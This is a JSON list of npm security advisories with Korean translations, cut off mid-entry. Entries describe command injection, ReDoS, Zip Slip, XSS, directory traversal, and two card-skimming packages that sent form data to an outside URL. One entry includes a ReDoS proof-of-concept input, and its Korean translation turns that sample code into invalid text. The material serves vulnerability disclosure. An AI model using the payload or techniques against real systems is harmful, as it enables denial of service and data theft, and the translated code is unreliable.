[
  {
    "description": "Versions of the package exec-local-bin before 1.2.0 are vulnerable to Command Injection via the `theProcess()` functionality due to improper user-input sanitization.",
    "identifiers": "GHSA : GHSA-f259-h6m8-hm8m\nCVE : CVE-2022-25923",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-08T22:04:54Z",
    "publishedAt": "2023-01-06T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25923\nhttps://github.com/saeedseyfi/exec-local-bin/commit/d425866375c85038133a6f79db2aac66c0a72624\nhttps://github.com/saeedseyfi/exec-local-bin/blob/92db00bde9d6e2d83410849f898df12f075b73b0/index.js%23L9\nhttps://security.snyk.io/vuln/SNYK-JS-EXECLOCALBIN-3157956\nhttps://github.com/advisories/GHSA-f259-h6m8-hm8m",
    "name": "exec-local-bin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.0",
    "identifier": "1.2.0",
    "descriptionKR": "패키지 exec-local-bin 1.2.0 이전 버전은 부적절한 사용자 입력 삭제로 인해 `theProcess()` 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "### Impact\n\nThis impacts users that use shescape to escape arguments:\n\n- for the Unix shell Bash, or any not-officially-supported Unix shell;\n- using the `escape` or `escapeAll` functions with the `interpolation` option set to `true`.\n\nAn attacker can cause polynomial backtracking in terms of the input string length due to a Regular Expression in shescape that is vulnerable to Regular Expression Denial of Service (ReDoS). Example:\n\n```javascript\nimport * as shescape from \"shescape\";\n\n/* 1. Prerequisites */\nconst options = {\n  interpolation: true,\n  // and\n  shell: \"/bin/bash\",\n  // or\n  shell: \"some-not-officially-supported-shell\",\n  // or\n  shell: undefined, // Only if the system's default shell is bash or an unsupported shell.\n};\n\n/* 2. Attack */\nlet userInput = '{,'.repeat(150_000); // polynomial backtracking\n\n/* 3. Usage */\nshescape.escape(userInput, options);\n// or\nshescape.escapeAll([userInput], options);\n```\n\n### Patches\n\nThis bug has been patched in [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1) which you can upgrade to now. No further changes required.\n\n### Workarounds\n\nAlternatively, a maximum length can be enforced on input strings to shescape to reduce the impact of the vulnerability. It is not recommended to try and detect vulnerable input strings, as the logic for this may end up being vulnerable to ReDoS itself.\n\n### References\n\n- Shescape commit [552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)\n- Shescape Release [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1)\n\n### For more information\n\n- Comment on commit [552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)\n- Open an issue at [https://github.com/ericcornelissen/shescape/issues](https://github.com/ericcornelissen/shescape/issues?q=is%3Aissue+is%3Aopen) (New issue > Question > Get started)\n",
    "identifiers": "GHSA : GHSA-cr84-xvw4-qx3c\nCVE : CVE-2022-25918",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:24:13Z",
    "publishedAt": "2022-10-25T22:27:32Z",
    "references": "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-cr84-xvw4-qx3c\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25918\nhttps://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9\nhttps://github.com/ericcornelissen/shescape/blob/main/src/unix.js%23L52\nhttps://github.com/ericcornelissen/shescape/releases/tag/v1.6.1\nhttps://security.snyk.io/vuln/SNYK-JS-SHESCAPE-3061108\nhttps://github.com/advisories/GHSA-cr84-xvw4-qx3c",
    "name": "shescape",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.5.10, < 1.6.1",
    "identifier": "1.6.1",
    "descriptionKR": "### 영향\n\n이는 인수를 이스케이프하기 위해 shescape를 사용하는 사용자에게 영향을 미칩니다.\n\n- Unix 셸 Bash 또는 공식적으로 지원되지 않는 Unix 셸의 경우\n- `interpolation` 옵션이 `true`로 설정된 `escape` 또는 `escapeAll` 기능 사용.\n\n공격자는 정규식 서비스 거부(ReDoS)에 취약한 shescape의 정규식으로 인해 입력 문자열 길이 측면에서 다항식 역추적을 일으킬 수 있습니다. 예:\n\n```자바스크립트\n\"shescape\"에서 *를 shescape로 가져오기;\n\n/* 1. 전제 조건 */\nconst 옵션 = {\n  보간: 참,\n  // 그리고\n  쉘: \"/bin/bash\",\n  // 또는\n  쉘: \"공식적으로 지원되지 않는 일부 쉘\",\n  // 또는\n  shell: undefined, // 시스템의 기본 셸이 bash이거나 지원되지 않는 셸인 경우에만.\n};\n\n/* 2. 공격 */\nlet userInput = '{,'.repeat(150_000); // 다항식 역추적\n\n/* 3. 사용법 */\nshescape.escape(userInput, 옵션);\n// 또는\nshescape.escapeAll([userInput], 옵션);\n```\n\n### 패치\n\n이 버그는 [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1)에서 패치되었으며 지금 업그레이드할 수 있습니다. 추가 변경이 필요하지 않습니다.\n\n### 해결 방법\n\n또는 취약점의 영향을 줄이기 위해 shescape에 대한 입력 문자열에 최대 길이를 적용할 수 있습니다. 취약한 입력 문자열을 감지하려고 시도하는 것은 권장되지 않습니다. 이에 대한 논리가 결국 ReDoS 자체에 취약해질 수 있기 때문입니다.\n\n### 참조\n\n- Shescape 커밋 [552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)\n- Shescape 릴리스 [v1.6.1](https://github.com/ericcornelissen/shescape/releases/tag/v1.6.1)\n\n### 자세한 내용은\n\n- 커밋[552e8ea](https://github.com/ericcornelissen/shescape/commit/552e8eab56861720b1d4e5474fb65741643358f9)에 댓글 달기\n- [https://github.com/ericcornelissen/shescape/issues](https://github.com/ericcornelissen/shescape/issues?q=is%3Aissue+is%3Aopen)에서 문제 열기(새 문제 > 질문) > 시작하기)"
  },
  {
    "description": "The package zip-local before 0.3.5 are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) which can lead to an extraction of a crafted file outside the intended extraction directory.",
    "identifiers": "GHSA : GHSA-wxj7-97fp-j53j\nCVE : CVE-2021-23484",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-08T20:15:02Z",
    "publishedAt": "2022-02-01T00:46:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23484\nhttps://github.com/Mostafa-Samir/zip-local/commit/949446a95a660c0752b1db0c654f0fd619ae6085\nhttps://github.com/Mostafa-Samir/zip-local/blob/master/main.js%23L365\nhttps://snyk.io/vuln/SNYK-JS-ZIPLOCAL-2327477\nhttps://github.com/Mostafa-Samir/zip-local/commit/6bb9b59733df379ac168aa705790bd8339b4bf9b\nhttps://github.com/advisories/GHSA-wxj7-97fp-j53j",
    "name": "zip-local",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.5",
    "identifier": "0.3.5",
    "descriptionKR": "0.3.5 이전 패키지 zip-local은 의도한 추출 디렉토리 외부에서 조작된 파일을 추출할 수 있는 아카이브 추출을 통한 임의 파일 쓰기(Zip Slip)에 취약합니다."
  },
  {
    "description": "### Impact\nThe `import-in-the-middle` loader works by generating a wrapper module on the fly. The wrapper uses the module specifier to load the original module and add some wrapping code. It allows for remote code execution in cases where an application passes user-supplied input directly to an import() function.\n\n### Patches\nThis vulnerability has been patched in `import-in-the-middle` version 1.4.2\n\n### Workarounds\n* Do not pass any user-supplied input to `import()`. Instead, verify it against a set of allowed values.\n* If using `import-in-the-middle` and support for EcmaScript Modules is not needed, ensure that none of the following options are set (either via command-line or the `NODE_OPTIONS` environment variable):\n```\n--loader=import-in-the-middle/hook.mjs\n--loader import-in-the-middle/hook.mjs\n```\n\n### References\nIf you have any questions or comments about this advisory, email us at [security@datadoghq.com](mailto:security@datadoghq.com)",
    "identifiers": "GHSA : GHSA-5r27-rw8r-7967\nCVE : CVE-2023-38704",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T19:26:41Z",
    "publishedAt": "2023-08-08T19:26:40Z",
    "references": "https://github.com/DataDog/import-in-the-middle/security/advisories/GHSA-5r27-rw8r-7967\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38704\nhttps://github.com/DataDog/import-in-the-middle/commit/2531cdd9d1d73f9eaa87c16967f60cb276c1971b\nhttps://github.com/advisories/GHSA-5r27-rw8r-7967",
    "name": "import-in-the-middle",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.1",
    "identifier": "1.4.2",
    "descriptionKR": "### 영향\n'import-in-the-middle' 로더는 즉석에서 래퍼 모듈을 생성하여 작동합니다. 래퍼는 모듈 지정자를 사용하여 원래 모듈을 로드하고 일부 래핑 코드를 추가합니다. 애플리케이션이 사용자 제공 입력을 import() 함수에 직접 전달하는 경우 원격 코드 실행을 허용합니다.\n\n### 패치\n이 취약점은 `import-in-the-middle` 버전 1.4.2에서 패치되었습니다.\n\n### 해결 방법\n* 사용자 제공 입력을 `import()`에 전달하지 마십시오. 대신 허용되는 값 세트에 대해 확인하십시오.\n* `import-in-the-middle`을 사용하고 EcmaScript 모듈 지원이 필요하지 않은 경우 다음 옵션 중 어느 것도 설정되지 않았는지 확인하십시오(명령줄 또는 `NODE_OPTIONS` 환경 변수를 통해).\n```\n--loader=import-in-the-middle/hook.mjs\n--loader import-in-the-middle/hook.mjs\n```\n\n### 참조\n이 권고에 대한 질문이나 의견이 있는 경우 [security@datadoghq.com](mailto:security@datadoghq.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "Version 1.0.2 of `uploader-plugin` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.1",
    "identifiers": "GHSA : GHSA-fx6f-fpfv-5hmc",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-05T05:02:38Z",
    "publishedAt": "2020-09-03T19:10:12Z",
    "references": "https://www.npmjs.com/advisories/1100\nhttps://github.com/advisories/GHSA-fx6f-fpfv-5hmc",
    "name": "uploader-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.2",
    "descriptionKR": "`uploader-plugin` 버전 1.0.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 비밀번호, cvc, 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하십시오. 또한 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인하는 것이 좋습니다.\n\n사용자는 버전 1.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Version 1.0.2 of `radic-util` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised.\n\nUsers may consider downgrading to version 1.0.1",
    "identifiers": "GHSA : GHSA-8qh7-xw58-3ww7",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-05T05:02:07Z",
    "publishedAt": "2020-09-11T21:25:37Z",
    "references": "https://www.npmjs.com/advisories/942\nhttps://github.com/advisories/GHSA-8qh7-xw58-3ww7",
    "name": "radic-util",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.2",
    "descriptionKR": "`radic-util` 버전 1.0.2에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다.\n\n사용자는 버전 1.0.1로의 다운그레이드를 고려할 수 있습니다."
  },
  {
    "description": "Multiple cross-site scripting (XSS) vulnerabilities in NodeBB before 0.7 allow remote attackers to inject arbitrary web script or HTML via vectors related to (1) javascript: or (2) data: URLs.",
    "identifiers": "GHSA : GHSA-9g4f-5rpg-4948\nCVE : CVE-2015-3296",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T23:16:46Z",
    "publishedAt": "2022-05-17T00:47:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-3296\nhttp://www.openwall.com/lists/oss-security/2015/04/10/10\nhttps://github.com/NodeBB/NodeBB/issues/2273\nhttps://github.com/NodeBB/nodebb-plugin-markdown/commit/ab7f2684750882f7baefbfa31db8d5aac71e6ec3\nhttps://github.com/markdown-it/markdown-it/commit/f76d3beb46abd121892a2e2e5c78376354c214e3\nhttps://web.archive.org/web/20200228230630/http://www.securityfocus.com/bid/71824\nhttps://github.com/advisories/GHSA-9g4f-5rpg-4948",
    "name": "nodebb-plugin-markdown",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.1.1",
    "identifier": "5.1.1",
    "descriptionKR": "NodeBB 0.7 이전의 여러 XSS(교차 사이트 스크립팅) 취약성으로 인해 원격 공격자가 (1) javascript: 또는 (2) data: URL과 관련된 벡터를 통해 임의의 웹 스크립트 또는 HTML을 주입할 수 있습니다."
  },
  {
    "description": "Multiple cross-site scripting (XSS) vulnerabilities in NodeBB before 0.7 allow remote attackers to inject arbitrary web script or HTML via vectors related to (1) javascript: or (2) data: URLs.",
    "identifiers": "GHSA : GHSA-9g4f-5rpg-4948\nCVE : CVE-2015-3296",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T23:16:46Z",
    "publishedAt": "2022-05-17T00:47:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-3296\nhttp://www.openwall.com/lists/oss-security/2015/04/10/10\nhttps://github.com/NodeBB/NodeBB/issues/2273\nhttps://github.com/NodeBB/nodebb-plugin-markdown/commit/ab7f2684750882f7baefbfa31db8d5aac71e6ec3\nhttps://github.com/markdown-it/markdown-it/commit/f76d3beb46abd121892a2e2e5c78376354c214e3\nhttps://web.archive.org/web/20200228230630/http://www.securityfocus.com/bid/71824\nhttps://github.com/advisories/GHSA-9g4f-5rpg-4948",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.70",
    "identifier": "0.70",
    "descriptionKR": "NodeBB 0.7 이전의 여러 XSS(교차 사이트 스크립팅) 취약성으로 인해 원격 공격자가 (1) javascript: 또는 (2) data: URL과 관련된 벡터를 통해 임의의 웹 스크립트 또는 HTML을 주입할 수 있습니다."
  },
  {
    "description": "### Impact\n\nIt is possible to craft a command with newlines which would not be properly parsed. This would mean you could pass a string of commands as a channel name, which would then be run by the IRC bridge bot. \n\n### Patches\n\nVersions 1.0.1 and above are patched.\n\n### Workarounds\n\nThere are no robust workarounds to the bug. You can disable dynamic channels in the config to disable the most common execution method but others may exist. It is highly recommended to upgrade the bridge.\n\n### Credits\n\nDiscovered and reported by [Val Lorentz](https://valentin-lorentz.fr/).\n\n### For more information\n\nIf you have any questions or comments about this advisory email us at [security@matrix.org](mailto:security@matrix.org).",
    "identifiers": "GHSA : GHSA-3pmj-jqqp-2mj3\nCVE : CVE-2023-38690",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T18:41:53Z",
    "publishedAt": "2023-08-04T17:26:45Z",
    "references": "https://github.com/matrix-org/matrix-appservice-irc/security/advisories/GHSA-3pmj-jqqp-2mj3\nhttps://github.com/matrix-org/matrix-appservice-irc/commit/0afb064635d37e039067b5b3d6423448b93026d3\nhttps://github.com/matrix-org/matrix-appservice-irc/releases/tag/1.0.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38690\nhttps://github.com/advisories/GHSA-3pmj-jqqp-2mj3",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "identifier": "1.0.1",
    "descriptionKR": "### 영향\n\n제대로 구문 분석되지 않는 줄 바꿈으로 명령을 만드는 것이 가능합니다. 이는 일련의 명령을 채널 이름으로 전달할 수 있으며 IRC 브리지 봇에 의해 실행될 수 있음을 의미합니다.\n\n### 패치\n\n버전 1.0.1 이상은 패치되었습니다.\n\n### 해결 방법\n\n버그에 대한 강력한 해결 방법은 없습니다. 구성에서 동적 채널을 비활성화하여 가장 일반적인 실행 방법을 비활성화할 수 있지만 다른 방법이 있을 수 있습니다. 브리지를 업그레이드하는 것이 좋습니다.\n\n### 크레딧\n\n[Val Lorentz](https://valentin-lorentz.fr/)에서 발견하고 보고했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nA malicious Matrix server can use a foreign user's MXID in an OpenID exchange, allowing a bad actor to impersonate users when using the provisioning API.\n\n### Details\n\nThe library does not check that the servername part of the `sub` parameter (containing the user's *claimed* MXID) is the same as the servername we are talking to. A malicious actor could spin up a server on any given domain, respond with a `sub` parameter according to the user they want to act as and use the resulting token to perform provisioning requests.\n\n### Workarounds\n\nDisable the provisioning API. If the bridge does not use the provisioning API, you are not vulnerable.\n",
    "identifiers": "GHSA : GHSA-vc7j-h8xg-fv5x\nCVE : CVE-2023-38691",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T18:41:58Z",
    "publishedAt": "2023-08-04T17:26:32Z",
    "references": "https://github.com/matrix-org/matrix-appservice-bridge/security/advisories/GHSA-vc7j-h8xg-fv5x\nhttps://github.com/matrix-org/matrix-appservice-bridge/commit/4c6723a5e7beda65cdf1ae5dbb882e8beaac8552\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38691\nhttps://github.com/advisories/GHSA-vc7j-h8xg-fv5x",
    "name": "matrix-appservice-bridge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 9.0.0",
    "identifier": "9.0.1",
    "descriptionKR": "### 영향\n\n악의적인 Matrix 서버는 OpenID 교환에서 외부 사용자의 MXID를 사용할 수 있으므로 악의적인 행위자가 프로비저닝 API를 사용할 때 사용자를 가장할 수 있습니다.\n\n### 세부 정보\n\n라이브러리는 (사용자의 *claimed* MXID를 포함하는) `sub` 매개변수의 서버 이름 부분이 대화 중인 서버 이름과 동일한지 확인하지 않습니다. 악의적인 행위자는 지정된 도메인에서 서버를 가동하고, 역할을 수행하려는 사용자에 따라 'sub' 매개변수로 응답하고 결과 토큰을 사용하여 프로비저닝 요청을 수행할 수 있습니다.\n\n### 해결 방법\n\n프로비저닝 API를 비활성화합니다. 브리지가 프로비저닝 API를 사용하지 않으면 취약하지 않습니다."
  },
  {
    "description": "### Impact\n\nA malicious Matrix server can use a foreign user's MXID in an OpenID exchange, allowing a bad actor to impersonate users when using the provisioning API.\n\n### Details\n\nThe library does not check that the servername part of the `sub` parameter (containing the user's *claimed* MXID) is the same as the servername we are talking to. A malicious actor could spin up a server on any given domain, respond with a `sub` parameter according to the user they want to act as and use the resulting token to perform provisioning requests.\n\n### Workarounds\n\nDisable the provisioning API. If the bridge does not use the provisioning API, you are not vulnerable.\n",
    "identifiers": "GHSA : GHSA-vc7j-h8xg-fv5x\nCVE : CVE-2023-38691",
    "severity": "MODERATE",
    "updatedAt": "2023-08-04T18:41:58Z",
    "publishedAt": "2023-08-04T17:26:32Z",
    "references": "https://github.com/matrix-org/matrix-appservice-bridge/security/advisories/GHSA-vc7j-h8xg-fv5x\nhttps://github.com/matrix-org/matrix-appservice-bridge/commit/4c6723a5e7beda65cdf1ae5dbb882e8beaac8552\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38691\nhttps://github.com/advisories/GHSA-vc7j-h8xg-fv5x",
    "name": "matrix-appservice-bridge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 8.1.2",
    "identifier": "8.1.2",
    "descriptionKR": "### 영향\n\n악의적인 Matrix 서버는 OpenID 교환에서 외부 사용자의 MXID를 사용할 수 있으므로 악의적인 행위자가 프로비저닝 API를 사용할 때 사용자를 가장할 수 있습니다.\n\n### 세부 정보\n\n라이브러리는 (사용자의 *claimed* MXID를 포함하는) `sub` 매개변수의 서버 이름 부분이 대화 중인 서버 이름과 동일한지 확인하지 않습니다. 악의적인 행위자는 지정된 도메인에서 서버를 가동하고, 역할을 수행하려는 사용자에 따라 'sub' 매개변수로 응답하고 결과 토큰을 사용하여 프로비저닝 요청을 수행할 수 있습니다.\n\n### 해결 방법\n\n프로비저닝 API를 비활성화합니다. 브리지가 프로비저닝 API를 사용하지 않으면 취약하지 않습니다."
  },
  {
    "description": "### Impact\n\nIt was possible to craft an event such that it would leak part of a targeted message event from another bridged room. This required knowing an event ID to target.\n\n### Patches\n\nPlease upgrade to 1.0.1.\n\n### Workarounds\n\nYou can set the `matrixHandler.eventCacheSize` config value to `0` to workaround this bug. However, this may impact performance.\n\n### Credits\n\nDiscovered and reported by [Val Lorentz](https://valentin-lorentz.fr/).\n\n### For more information\n\nIf you have any questions or comments about this advisory email us at [security@matrix.org](mailto:security@matrix.org).",
    "identifiers": "GHSA : GHSA-c7hh-3v6c-fj4q\nCVE : CVE-2023-38700",
    "severity": "LOW",
    "updatedAt": "2023-08-08T18:28:29Z",
    "publishedAt": "2023-08-04T17:26:07Z",
    "references": "https://github.com/matrix-org/matrix-appservice-irc/security/advisories/GHSA-c7hh-3v6c-fj4q\nhttps://github.com/matrix-org/matrix-appservice-irc/commit/8bbd2b69a16cbcbeffdd9b5c973fd89d61498d75\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38700\nhttps://github.com/matrix-org/matrix-appservice-irc/releases/tag/1.0.1\nhttps://github.com/advisories/GHSA-c7hh-3v6c-fj4q",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "identifier": "1.0.1",
    "descriptionKR": "### 영향\n\n연결된 다른 방에서 대상 메시지 이벤트의 일부를 유출하도록 이벤트를 만드는 것이 가능했습니다. 이를 위해서는 타겟팅할 이벤트 ID를 알아야 했습니다.\n\n### 패치\n\n1.0.1로 업그레이드하십시오.\n\n### 해결 방법\n\n이 버그를 해결하기 위해 `matrixHandler.eventCacheSize` 구성 값을 `0`으로 설정할 수 있습니다. 그러나 이는 성능에 영향을 미칠 수 있습니다.\n\n### 크레딧\n\n[Val Lorentz](https://valentin-lorentz.fr/)에서 발견하고 보고했습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@matrix.org](mailto:security@matrix.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\nAnyone who might have used Soketi with the `cluster` driver (or through PM2).\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\nGet the latest version of Soketi.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\nNone. It's advised to upgrade to the latest version.\n\n### References\n_Are there any links users can visit to find out more?_\n- https://github.com/advisories/GHSA-cchq-frgv-rjh5\n- https://github.com/patriksimek/vm2/issues/533\n- https://github.com/Unitech/pm2/issues/5643\n",
    "identifiers": "GHSA : GHSA-g6w6-h933-4rc5",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-03T19:44:53Z",
    "publishedAt": "2023-08-03T19:44:52Z",
    "references": "https://github.com/soketi/soketi/security/advisories/GHSA-g6w6-h933-4rc5\nhttps://github.com/Unitech/pm2/issues/5643\nhttps://github.com/patriksimek/vm2/issues/533\nhttps://github.com/soketi/soketi/pull/927\nhttps://github.com/soketi/soketi/commit/de12bff706c0d62e6a57dc1c7be3c4f014d0093a\nhttps://github.com/advisories/GHSA-cchq-frgv-rjh5\nhttps://github.com/soketi/soketi/releases/tag/1.6.0\nhttps://github.com/advisories/GHSA-g6w6-h933-4rc5",
    "name": "@soketi/soketi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.0",
    "identifier": "1.6.0",
    "descriptionKR": "### 영향\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n`클러스터` 드라이버와 함께(또는 PM2를 통해) Soketi를 사용한 사람.\n\n### 패치\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\nSoketi의 최신 버전을 받으세요.\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n없음. 최신 버전으로 업그레이드하는 것이 좋습니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n- https://github.com/advisories/GHSA-cchq-frgv-rjh5\n- https://github.com/patriksimek/vm2/issues/533\n- https://github.com/Unitech/pm2/issues/5643"
  },
  {
    "description": "Improper Access Control in GitHub repository budibase/budibase prior to 1.3.20.",
    "identifiers": "GHSA : GHSA-x92g-49gh-63qm\nCVE : CVE-2022-3225",
    "severity": "MODERATE",
    "updatedAt": "2023-08-03T16:41:40Z",
    "publishedAt": "2022-09-17T00:00:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3225\nhttps://github.com/budibase/budibase/commit/d35864be0854216693a01307f81ffcabf6d549df\nhttps://huntr.dev/bounties/a13a56b7-04da-4560-b8ec-0d637d12a245\nhttps://github.com/Budibase/budibase/releases/tag/v1.3.20\nhttps://github.com/advisories/GHSA-x92g-49gh-63qm",
    "name": "@budibase/bbui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.20",
    "identifier": "1.3.20",
    "descriptionKR": "1.3.20 이전의 GitHub 리포지토리 budibase/budibase에서 부적절한 액세스 제어."
  },
  {
    "description": "Improper Access Control in GitHub repository budibase/budibase prior to 1.3.20.",
    "identifiers": "GHSA : GHSA-x92g-49gh-63qm\nCVE : CVE-2022-3225",
    "severity": "MODERATE",
    "updatedAt": "2023-08-03T16:41:40Z",
    "publishedAt": "2022-09-17T00:00:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3225\nhttps://github.com/budibase/budibase/commit/d35864be0854216693a01307f81ffcabf6d549df\nhttps://huntr.dev/bounties/a13a56b7-04da-4560-b8ec-0d637d12a245\nhttps://github.com/Budibase/budibase/releases/tag/v1.3.20\nhttps://github.com/advisories/GHSA-x92g-49gh-63qm",
    "name": "@budibase/builder",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.20",
    "identifier": "1.3.20",
    "descriptionKR": "1.3.20 이전의 GitHub 리포지토리 budibase/budibase에서 부적절한 액세스 제어."
  },
  {
    "description": "Improper Access Control in GitHub repository budibase/budibase prior to 1.3.20.",
    "identifiers": "GHSA : GHSA-x92g-49gh-63qm\nCVE : CVE-2022-3225",
    "severity": "MODERATE",
    "updatedAt": "2023-08-03T16:41:40Z",
    "publishedAt": "2022-09-17T00:00:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3225\nhttps://github.com/budibase/budibase/commit/d35864be0854216693a01307f81ffcabf6d549df\nhttps://huntr.dev/bounties/a13a56b7-04da-4560-b8ec-0d637d12a245\nhttps://github.com/Budibase/budibase/releases/tag/v1.3.20\nhttps://github.com/advisories/GHSA-x92g-49gh-63qm",
    "name": "@budibase/worker",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.20",
    "identifier": "1.3.20",
    "descriptionKR": "1.3.20 이전의 GitHub 리포지토리 budibase/budibase에서 부적절한 액세스 제어."
  },
  {
    "description": "### Impact \nThe Wrangler command line tool (<=wrangler@3.1.0) was affected by a directory traversal vulnerability when running a local development server for Pages (wrangler pages dev command). This vulnerability enabled an attacker in the same network as the victim to connect to the local development server and access the victim's files present outside of the directory for the development server.\n\n### Patches\nUpgrade to wrangler@3.1.1 or higher.\n\n### References\n[Workers SDK on Github](https://github.com/cloudflare/workers-sdk)\n[Wrangler docs](https://developers.cloudflare.com/workers/wrangler/)\n[CVE-2023-3348](https://www.cve.org/CVERecord?id=CVE-2023-3348)",
    "identifiers": "GHSA : GHSA-8c93-4hch-xgxp\nCVE : CVE-2023-3348",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T22:14:42Z",
    "publishedAt": "2023-08-03T16:34:31Z",
    "references": "https://github.com/cloudflare/workers-sdk/security/advisories/GHSA-8c93-4hch-xgxp\nhttps://github.com/cloudflare/workers-sdk/pull/3498\nhttps://github.com/cloudflare/workers-sdk/commit/fddffdf0c23d2ca56f2139a2c6bc278052594cba\nhttps://github.com/cloudflare/workers-sdk/releases/tag/wrangler%403.1.1\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-3348\nhttps://developers.cloudflare.com/workers/wrangler/\nhttps://github.com/cloudflare/workers-sdk\nhttps://github.com/advisories/GHSA-8c93-4hch-xgxp",
    "name": "wrangler",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.1",
    "identifier": "3.1.1",
    "descriptionKR": "### 영향\nWrangler 명령줄 도구(<=wrangler@3.1.0)는 Pages용 로컬 개발 서버(wrangler pages dev 명령)를 실행할 때 디렉토리 탐색 취약점의 영향을 받았습니다. 이 취약점으로 인해 피해자와 동일한 네트워크에 있는 공격자가 로컬 개발 서버에 연결하고 개발 서버의 디렉터리 외부에 있는 피해자의 파일에 액세스할 수 있습니다.\n\n### 패치\nwrangler@3.1.1 이상으로 업그레이드하십시오.\n\n### 참조\n[Github의 작업자 SDK](https://github.com/cloudflare/workers-sdk)\n[Wrangler 문서](https://developers.cloudflare.com/workers/wrangler/)\n[CVE-2023-3348](https://www.cve.org/CVERecord?id=CVE-2023-3348)"
  },
  {
    "description": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package through 2.88.12 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
